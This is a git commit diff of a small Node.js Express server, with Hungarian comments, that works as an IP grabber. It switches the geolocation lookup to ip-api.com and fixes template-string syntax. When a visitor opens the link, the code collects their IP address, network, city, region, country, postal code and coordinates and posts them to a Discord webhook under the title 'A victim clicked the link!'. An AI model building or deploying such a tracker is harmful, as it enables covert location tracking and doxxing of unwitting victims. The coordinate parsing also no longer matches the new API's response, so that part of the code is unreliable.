c38248873607495f445abb2e57a25f406eb7005d
Szaby <szaby.korodi@yahoo.com>
2025-08-01 19:35:44 +0300

    Update script.js

--- script.js
+++ script.js
@@ -8,10 +8,9 @@ const port = process.env.PORT || 3000;
 // Statikus fájlok kiszolgálása (CSS, JS, stb.)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook URL és IPINFO token a .env fájlból
+// Webhook URL-ek a .env fájlból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
-const ipinfoToken = process.env.IPINFO_TOKEN;
 
 // Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
 app.get('/', (req, res) => {
@@ -28,22 +27,26 @@ app.get('/send-ip', async (req, res) => {
     const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
 
     try {
-        const geoResponse = await axios.get(https://ipinfo.io/${userIp}?token=${ipinfoToken});
+        // IP geolokáció lekérése ip-api használatával (API kulcs nélkül)
+        const geoResponse = await axios.get(`http://ip-api.com/json/${userIp}`);
         const geoData = geoResponse.data;
 
+        // Az API válaszból kiolvassuk a szükséges adatokat
         const [latitude, longitude] = (geoData.loc || '0,0').split(',');
 
+        // A webhook üzenet elkészítése
         const message = {
             username: "Helyszíni Naplózó <3",
             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
-            content: <@1095731086513930260>,
+            content: `<@1095731086513930260>`,
             embeds: [{
                 title: "Egy áldozat rákattintott a linkre!",
-                description: **IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude},
+                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.zip || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                 color: 0x800080
             }]
         };
 
+        // Webhook küldés az alapértelmezett URL-re
         await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
         res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
@@ -53,5 +56,5 @@ app.get('/send-ip', async (req, res) => {
 });
 
 app.listen(port, () => {
-    console.log(Server is running on http://localhost:${port});
+    console.log(`Server is running on http://localhost:${port}`);
 });
